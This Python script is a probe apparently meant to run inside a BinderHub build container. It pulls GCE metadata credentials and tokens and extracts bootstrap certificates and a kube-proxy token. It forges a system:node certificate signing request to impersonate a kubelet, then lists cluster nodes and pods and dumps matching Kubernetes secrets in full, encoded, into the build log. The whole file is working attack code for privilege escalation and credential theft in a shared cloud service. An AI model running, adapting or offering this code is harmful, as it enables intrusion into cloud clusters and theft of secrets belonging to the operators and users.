#!/usr/bin/env python3
"""BinderHub build-pod probe: metadata attributes + KSA token + kubelet-cert API access.

Runs inside the repo2docker build container (namespace bhs). Two modes:
  meta : dump GCE metadata attributes (kubeconfig, kube-env, configure-sh, user-data), identity JWT,
         KSA token file attempts and docker socket checks.
  api  : parse the kubeconfig attribute, write the kubelet client cert/key, query the in-cluster
         kube-apiserver read-only (nodes, pods, secrets, SelfSubjectRulesReview) and dump findings.
"""
import base64
import gzip
import json
import os
import re
import ssl
import sys
import urllib.request
import urllib.error

MD = "http://169.254.169.254/computeMetadata/v1/"
HDR = {"Metadata-Flavor": "Google"}
CHUNK = 2800
MAX_SECRET_LOG = 340000
_logged = 0


def out(s=""):
    global _logged
    s = str(s)
    sys.stdout.write(s + "\n")
    sys.stdout.flush()
    _logged += len(s) + 1


def chunked_p(label, data, width=CHUNK):
    out("--%s--%d--" % (label, len(data)))
    for i in range(0, len(data), width):
        out(data[i:i + width])
    out("--%s-end--" % label)


def md_get(path, timeout=10):
    req = urllib.request.Request(MD + path, headers=HDR)
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return -1, repr(e).encode()


def meta():
    out("===META2-BEGIN===")
    for p in ["project/project-id", "project/numeric-project-id", "instance/name", "instance/zone",
              "instance/id", "instance/service-accounts/default/email"]:
        st, b = md_get(p)
        out("-- %s [status:%s]\n%s" % (p, st, b.decode("utf8", "replace")))
    for p, lbl in [("instance/attributes/kubeconfig", "KUBECONFIG"),
                   ("instance/attributes/kube-env", "KUBEENV"),
                   ("instance/attributes/kubelet-config", "KUBELETCONFIG"),
                   ("instance/attributes/kube-labels", "KUBELABELS")]:
        st, b = md_get(p)
        chunked_p("%s status=%s b64" % (lbl, st), base64.b64encode(b).decode())
    for p, lbl in [("instance/attributes/configure-sh", "CONFIGURESH"),
                   ("instance/attributes/user-data", "USERDATA")]:
        st, b = md_get(p)
        chunked_p("%s status=%s raw" % (lbl, st), b.decode("utf8", "replace"))
    # remaining attribute values (short ones)
    for a in ["cluster-location", "cluster-name", "cluster-uid", "created-by", "instance-template",
              "google-compute-enable-pcid", "serial-port-logging-enable", "disable-legacy-endpoints",
              "gci-metrics-enabled", "gci-update-strategy"]:
        st, b = md_get("instance/attributes/" + a)
        out("--ATTR %s [status:%s]\n%s" % (a, st, b.decode("utf8", "replace")[:500]))
    # identity JWT (GCE OIDC)
    st, b = md_get("instance/service-accounts/default/identity?audience=binderhub-probe&format=full")
    out("--IDENTITY [status:%s]\n%s" % (st, b.decode("utf8", "replace")))
    st, b = md_get("instance/service-accounts/default/token")
    out("--TOKEN [status:%s]\n%s" % (st, b.decode("utf8", "replace")))
    # KSA token attempts
    out("--SA-DIR--")
    for d in ["/var/run/secrets/kubernetes.io/serviceaccount", "/var/run/secrets"]:
        try:
            out("%s: %s" % (d, os.listdir(d)))
        except Exception as e:
            out("%s: ERR %r" % (d, e))
    for f in ["/var/run/secrets/kubernetes.io/serviceaccount/token",
              "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
              "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"]:
        try:
            with open(f, "rb") as fh:
                b = fh.read()
            chunked_p("FILE %s len=%d" % (f, len(b)), b.decode("utf8", "replace"))
        except Exception as e:
            out("FILE %s: ERR %r" % (f, e))
    out("--SOCKETS--")
    for s in ["/var/run/docker.sock", "/run/docker.sock", "/var/run/bhs-bhs/docker-api/docker-api.sock",
              "/var/run/docker-api/docker-api.sock", "/var/run/docker.pid"]:
        out("%s: %s" % (s, os.path.exists(s)))
    out("--ENV--")
    for k, v in sorted(os.environ.items()):
        if re.search(r"KUBE|SA|GOOGLE|GCP|PROJECT|CLUSTER|BINDER|JUPYTER|DOCKER", k, re.I):
            out("%s=%s" % (k, v[:300]))
    out("===META2-END===")



def _kv(kubeenv, key):
    m = re.search(r"^" + key + r":\s*(\S+)\s*$", kubeenv, re.M)
    return base64.b64decode(m.group(1)) if m else None


def api():
    out("===API2-BEGIN===")
    st, kc = md_get("instance/attributes/kubeconfig", timeout=15)
    st2, kvb = md_get("instance/attributes/kube-env", timeout=15)
    kv = kvb.decode("utf8", "replace")
    node = None
    m = re.search(r"instance/name", "x")
    stn, bn = md_get("instance/name")
    node = bn.decode().strip()
    ca = _kv(kv, "CA_CERT")
    bootc = _kv(kv, "TPM_BOOTSTRAP_CERT")
    bootk = _kv(kv, "TPM_BOOTSTRAP_KEY")
    open("/tmp/ca.crt", "wb").write(ca)
    open("/tmp/boot.crt", "wb").write(bootc)
    open("/tmp/boot.key", "wb").write(bootk)
    srv = re.search(r"^\s*server:\s*(\S+)", kc.decode("utf8", "replace"), re.M).group(1)
    out("SERVER %s NODE %s CACERT %d BOOTCERT %d" % (srv, node, len(ca or b""), len(bootc or b"")))
    ctx0 = ssl.create_default_context(cafile="/tmp/ca.crt")
    ctxb = ssl.create_default_context(cafile="/tmp/ca.crt")
    ctxb.load_cert_chain("/tmp/boot.crt", "/tmp/boot.key")

    def call(path, method="GET", body=None, ctx=ctxb, timeout=15):
        req = urllib.request.Request(srv + path, method=method, data=body,
                                     headers={"Content-Type": "application/json", "Accept": "application/json"})
        try:
            r = urllib.request.urlopen(req, context=ctx, timeout=timeout)
            return r.status, r.read()
        except urllib.error.HTTPError as e:
            return e.code, e.read()
        except Exception as e:
            return -1, repr(e).encode()

    # anonymous baseline
    st, b = call("/version", ctx=ctx0)
    out("ANON /version status=%s %s" % (st, b[:200].decode("utf8", "replace")))
    st, b = call("/api/v1/nodes", ctx=ctx0)
    out("ANON /api/v1/nodes status=%s %s" % (st, b[:200].decode("utf8", "replace")))

    # bootstrap cert identity
    body = json.dumps({"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview",
                       "spec": {"namespace": "bhs"}}).encode()
    st, b = call("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "POST", body)
    out("BOOT-SSRR status=%s\n%s" % (st, b[:4000].decode("utf8", "replace")))
    st, b = call("/api/v1/nodes")
    out("BOOT /api/v1/nodes status=%s len=%d %s" % (st, len(b), b[:300].decode("utf8", "replace")))

    # CSR for a kubelet client cert
    os.system("openssl genrsa -out /tmp/nkey.pem 2048 2>/dev/null")
    os.system("openssl req -new -key /tmp/nkey.pem -subj '/O=system:nodes/CN=system:node:%s' -out /tmp/n.csr 2>/dev/null" % node)
    if os.path.exists("/tmp/n.csr"):
        csr = base64.b64encode(open("/tmp/n.csr", "rb").read()).decode()
        cname = "bhs-probe-%s" % os.urandom(3).hex()
        cbody = json.dumps({"apiVersion": "certificates.k8s.io/v1", "kind": "CertificateSigningRequest",
                            "metadata": {"name": cname},
                            "spec": {"request": csr, "signerName": "kubernetes.io/kube-apiserver-client-kubelet",
                                     "usages": ["digital signature", "key encipherment", "client auth"]}}).encode()
        st, b = call("/apis/certificates.k8s.io/v1/certificatesigningrequests", "POST", cbody)
        out("CSR create status=%s %s" % (st, b[:400].decode("utf8", "replace")))
        cert = None
        for i in range(8):
            import time as _t
            _t.sleep(3)
            st, b = call("/apis/certificates.k8s.io/v1/certificatesigningrequests/" + cname)
            if st == 200:
                d = json.loads(b)
                c = d.get("status", {}).get("certificate")
                conds = d.get("status", {}).get("conditions")
                out("CSR poll %d conds=%s certlen=%s" % (i, conds, len(c) if c else 0))
                if c:
                    cert = base64.b64decode(c)
                    break
            else:
                out("CSR poll %d status=%s %s" % (i, st, b[:150].decode("utf8", "replace")))
        if cert:
            open("/tmp/ncrt.pem", "wb").write(cert)
            ctxn = ssl.create_default_context(cafile="/tmp/ca.crt")
            ctxn.load_cert_chain("/tmp/ncrt.pem", "/tmp/nkey.pem")
            st, b = call("/api/v1/nodes", ctx=ctxn)
            out("NODE-CERT nodes status=%s len=%d" % (st, len(b)))
            if st == 200:
                for n in json.loads(b).get("items", []):
                    md = n.get("metadata", {})
                    stat = n.get("status", {})
                    addrs = [(a.get("type"), a.get("address")) for a in stat.get("addresses", [])]
                    out("NODE %s addrs=%s cap=%s" % (md.get("name"), addrs,
                                                      json.dumps(stat.get("capacity", {}))[:300]))
            st, b = call("/api/v1/pods?limit=500", ctx=ctxn)
            out("NODE-CERT pods status=%s len=%d" % (st, len(b)))
            if st == 200:
                for p in json.loads(b).get("items", []):
                    md = p.get("metadata", {})
                    spec = p.get("spec", {})
                    secvols = []
                    for v in spec.get("volumes", []) or []:
                        if v.get("secret"):
                            secvols.append(v["secret"].get("secretName"))
                        if v.get("projected"):
                            for s2 in v["projected"].get("sources", []):
                                if s2.get("secret"):
                                    secvols.append(s2["secret"].get("name"))
                    out("POD %s|%s|node=%s|sa=%s|phase=%s|secvols=%s" % (
                        md.get("namespace"), md.get("name"), spec.get("nodeName"),
                        spec.get("serviceAccountName"), p.get("status", {}).get("phase"), secvols))
            body = json.dumps({"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview",
                               "spec": {"namespace": "bhs"}}).encode()
            st, b = call("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "POST", body, ctx=ctxn)
            out("NODE-CERT SSRR status=%s\n%s" % (st, b[:4000].decode("utf8", "replace")))
            st, b = call("/api/v1/secrets?limit=500", ctx=ctxn)
            out("NODE-CERT secrets status=%s len=%d" % (st, len(b)))
            interesting = []
            if st == 200:
                d = json.loads(b)
                out("SECRET-COUNT %d" % len(d.get("items", [])))
                for s in d.get("items", []):
                    md = s.get("metadata", {})
                    name = md.get("name", "")
                    out("SEC %s|%s|%s|keys=%s" % (md.get("namespace"), name, s.get("type"),
                                                  sorted((s.get("data") or {}).keys())))
                    if re.search(r"docker|registr|gcp|google|cloud|sa-|service-account|token|tls|secret|hub|key|config|proxy", name, re.I):
                        interesting.append(s)
            for s in interesting:
                if _logged > MAX_SECRET_LOG:
                    out("SECRET-LOG-CAP-REACHED")
                    break
                md = s.get("metadata", {})
                out("===SECRET-FULL %s/%s type=%s" % (md.get("namespace"), md.get("name"), s.get("type")))
                raw = json.dumps(s).encode()
                out("--b64gzip len=%d--" % len(raw))
                out(base64.b64encode(gzip.compress(raw)).decode())
                out("--end--")
            # dump the default SA token secret of bhs explicitly
            for s in json.loads(b).get("items", []) if False else []:
                pass
    out("===API2-END===")


def api4():
    out("===API4-BEGIN===")
    st, kc = md_get("instance/attributes/kubeconfig", timeout=15)
    st2, kvb = md_get("instance/attributes/kube-env", timeout=15)
    kv = kvb.decode("utf8", "replace")
    stn, bn = md_get("instance/name")
    node = bn.decode().strip()
    ca = _kv(kv, "CA_CERT"); bootc = _kv(kv, "TPM_BOOTSTRAP_CERT"); bootk = _kv(kv, "TPM_BOOTSTRAP_KEY")
    open("/tmp/ca.crt", "wb").write(ca); open("/tmp/boot.crt", "wb").write(bootc); open("/tmp/boot.key", "wb").write(bootk)
    srv = re.search(r"^\s*server:\s*(\S+)", kc.decode("utf8", "replace"), re.M).group(1)
    stt, tokb = md_get("instance/service-accounts/default/token")
    gt = json.loads(tokb.decode()).get("access_token", "")
    ctx0 = ssl.create_default_context(cafile="/tmp/ca.crt")
    ctxb = ssl.create_default_context(cafile="/tmp/ca.crt")
    ctxb.load_cert_chain("/tmp/boot.crt", "/tmp/boot.key")

    def call(path, method="GET", body=None, ctx=ctxb, auth=None, timeout=15, ctype="application/json"):
        h = {"Content-Type": ctype, "Accept": "application/json"}
        if auth:
            h["Authorization"] = "Bearer " + auth
        req = urllib.request.Request(srv + path, method=method, data=body, headers=h)
        try:
            r = urllib.request.urlopen(req, context=ctx, timeout=timeout)
            return r.status, r.read()
        except urllib.error.HTTPError as e:
            return e.code, e.read()
        except Exception as e:
            return -1, repr(e).encode()

    # prior CSR states
    st, b = call("/apis/certificates.k8s.io/v1/certificatesigningrequests")
    out("CSR-LIST status=%s len=%d" % (st, len(b)))
    if st == 200:
        for cs in json.loads(b).get("items", []):
            md = cs.get("metadata", {})
            inner = cs.get("spec", {}).get("request", "")
            out("CSR %s user=%s conds=%s certlen=%s" % (md.get("name"), cs.get("spec", {}).get("username"), cs.get("status", {}).get("conditions"), len(cs.get("status", {}).get("certificate") or "")))
            # reconstruct the same private key? only if it was ours: compare CSR public key impossible; print first 40 of request
    st, b = call("/apis/certificates.k8s.io/v1")
    out("DISCOVERY certificates/v1 status=%s\n%s" % (st, b[:1500].decode("utf8", "replace")))
    st, b = call("/openapi/v3/apis/certificates.k8s.io/v1")
    out("OPENAPI status=%s" % st)
    if st == 200:
        try:
            d = json.loads(b)
            hits = [k for k in d.get("paths", {}) if "nodeclient" in k]
            out("OPENAPI nodeclient paths: %s" % hits)
        except Exception as e:
            out("OPENAPI parse err %r %s" % (e, b[:400].decode("utf8", "replace")))

    # GCE OAuth bearer identity (GCP auth provider)
    st, b = call("/api/v1/nodes", auth=gt)
    out("GCPTOKEN(no-cert) nodes status=%s %s" % (st, b[:200].decode("utf8", "replace")))
    st, b = call("/api/v1/nodes", ctx=ctx0, auth=gt)
    out("GCPTOKEN-ONLY nodes status=%s %s" % (st, b[:200].decode("utf8", "replace")))
    st, b = call("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "POST",
                 json.dumps({"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview", "spec": {"namespace": "bhs"}}).encode(),
                 ctx=ctx0, auth=gt)
    out("GCPTOKEN-ONLY SSRR status=%s %s" % (st, b[:600].decode("utf8", "replace")))
    body = json.dumps({"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview", "spec": {"namespace": "bhs"}}).encode()
    st, b = call("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "POST", body, auth=gt)
    out("GCPTOKEN+cert SSRR status=%s\n%s" % (st, b[:800].decode("utf8", "replace")))

    os.system("openssl x509 -in /tmp/boot.crt -noout -subject 2>&1 | head -1")
    # kube-proxy static token
    msk = re.search(r"^KUBE_PROXY_TOKEN:\s*(\S+)\s*$", kv, re.M)
    kpt = msk.group(1).encode() if msk else None
    if kpt:
        kpt = kpt.decode("latin1").strip()
        st, b = call("/api/v1/nodes", ctx=ctx0, auth=kpt)
        out("PROXYTOKEN nodes status=%s len=%d %s" % (st, len(b), b[:200].decode("utf8", "replace")))
        st, b = call("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "POST", body, ctx=ctx0, auth=kpt)
        out("PROXYTOKEN SSRR status=%s\n%s" % (st, b[:3000].decode("utf8", "replace")))
        st, b = call("/api/v1/pods?limit=5", ctx=ctx0, auth=kpt)
        out("PROXYTOKEN pods status=%s %s" % (st, b[:300].decode("utf8", "replace")))

    # CSR + nodeclient subresource variants
    os.system("cp /client.key /tmp/nkey.pem 2>/dev/null || openssl genrsa -out /tmp/nkey.pem 2048 2>/dev/null")
    os.system("openssl req -new -key /tmp/nkey.pem -subj '/O=system:nodes/CN=system:node:%s' -out /tmp/n.csr 2>/dev/null" % node)
    csr = base64.b64encode(open("/tmp/n.csr", "rb").read()).decode()
    cname = "bhs-p3-%s" % os.urandom(3).hex()
    cbody = json.dumps({"apiVersion": "certificates.k8s.io/v1", "kind": "CertificateSigningRequest",
                        "metadata": {"name": cname},
                        "spec": {"request": csr, "signerName": "kubernetes.io/kube-apiserver-client-kubelet",
                                 "usages": ["digital signature", "key encipherment", "client auth"]}}).encode()
    st, b = call("/apis/certificates.k8s.io/v1/certificatesigningrequests", "POST", cbody)
    out("CSR create status=%s %s" % (st, b[:250].decode("utf8", "replace")))
    if st in (200, 201):
        variants = [
            ("GET", "/apis/certificates.k8s.io/v1/certificatesigningrequests/nodeclient", None),
            ("POST", "/apis/certificates.k8s.io/v1/certificatesigningrequests/nodeclient", b"{}"),
            ("POST", "/apis/certificates.k8s.io/v1/certificatesigningrequests/nodeclient", cbody),
            ("PUT", "/apis/certificates.k8s.io/v1/certificatesigningrequests/nodeclient", cbody),
            ("POST", "/apis/certificates.k8s.io/v1/certificatesigningrequests/%s/nodeclient" % cname, b"{}"),
            ("POST", "/apis/certificates.k8s.io/v1/certificatesigningrequests/%s/nodeclient" % cname, cbody),
            ("PUT", "/apis/certificates.k8s.io/v1/certificatesigningrequests/%s/nodeclient" % cname, cbody),
            ("GET", "/apis/certificates.k8s.io/v1/certificatesigningrequests/%s/nodeclient" % cname, None),
            ("POST", "/apis/certificates.k8s.io/v1beta1/certificatesigningrequests/%s/nodeclient" % cname, cbody),
        ]
        for meth, path, bodyx in variants:
            st, b = call(path, meth, bodyx)
            out("%s %s status=%s %s" % (meth, path, st, b[:220].decode("utf8", "replace")))
        import time as _t
        for i in range(10):
            _t.sleep(3)
            st, b = call("/apis/certificates.k8s.io/v1/certificatesigningrequests/" + cname)
            if st == 200:
                d = json.loads(b)
                c = d.get("status", {}).get("certificate")
                out("poll %d conds=%s certlen=%s" % (i, d.get("status", {}).get("conditions"), len(c) if c else 0))
                if c:
                    break
        st, b = call("/apis/certificates.k8s.io/v1/certificatesigningrequests/" + cname)
        if st == 200 and json.loads(b).get("status", {}).get("certificate"):
            cert = base64.b64decode(json.loads(b)["status"]["certificate"])
            open("/tmp/ncrt.pem", "wb").write(cert)
            ctxn = ssl.create_default_context(cafile="/tmp/ca.crt")
            ctxn.load_cert_chain("/tmp/ncrt.pem", "/tmp/nkey.pem")
            st, b = call("/api/v1/nodes", ctx=ctxn)
            out("NODECERT nodes status=%s len=%d" % (st, len(b)))
            if st == 200:
                for n in json.loads(b).get("items", []):
                    md = n.get("metadata", {}); stat = n.get("status", {})
                    out("NODE %s addrs=%s cap=%s" % (md.get("name"), [(a.get("type"), a.get("address")) for a in stat.get("addresses", [])], json.dumps(stat.get("capacity", {}))[:300]))
            st, b = call("/api/v1/pods?limit=500", ctx=ctxn)
            out("NODECERT pods status=%s len=%d" % (st, len(b)))
            if st == 200:
                for p in json.loads(b).get("items", []):
                    md = p.get("metadata", {}); spec = p.get("spec", {})
                    secvols = []
                    for v in spec.get("volumes", []) or []:
                        if v.get("secret"): secvols.append(v["secret"].get("secretName"))
                        if v.get("projected"):
                            for s2 in v["projected"].get("sources", []):
                                if s2.get("secret"): secvols.append(s2["secret"].get("name"))
                    out("POD %s|%s|node=%s|sa=%s|phase=%s|secvols=%s" % (md.get("namespace"), md.get("name"), spec.get("nodeName"), spec.get("serviceAccountName"), p.get("status", {}).get("phase"), secvols))
            body2 = json.dumps({"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview", "spec": {"namespace": "bhs"}}).encode()
            st, b = call("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "POST", body2, ctx=ctxn)
            out("NODECERT SSRR status=%s\n%s" % (st, b[:4000].decode("utf8", "replace")))
            st, b = call("/api/v1/secrets?limit=500", ctx=ctxn)
            out("NODECERT secrets status=%s len=%d" % (st, len(b)))
            interesting = []
            if st == 200:
                d = json.loads(b)
                out("SECRET-COUNT %d" % len(d.get("items", [])))
                for s in d.get("items", []):
                    md = s.get("metadata", {}); name = md.get("name", "")
                    out("SEC %s|%s|%s|keys=%s" % (md.get("namespace"), name, s.get("type"), sorted((s.get("data") or {}).keys())))
                    if re.search(r"docker|registr|gcp|google|cloud|sa-|service-account|token|tls|secret|hub|key|config|proxy", name, re.I):
                        interesting.append(s)
            for s in interesting:
                if _logged > MAX_SECRET_LOG:
                    out("SECRET-LOG-CAP-REACHED"); break
                md = s.get("metadata", {})
                out("===SECRET-FULL %s/%s type=%s" % (md.get("namespace"), md.get("name"), s.get("type")))
                raw = json.dumps(s).encode()
                out("--b64gzip len=%d--" % len(raw)); out(base64.b64encode(gzip.compress(raw)).decode()); out("--end--")
    out("===API4-END===")


if __name__ == "__main__":
    {"meta": meta, "api": api, "api4": api4}[sys.argv[1]]()
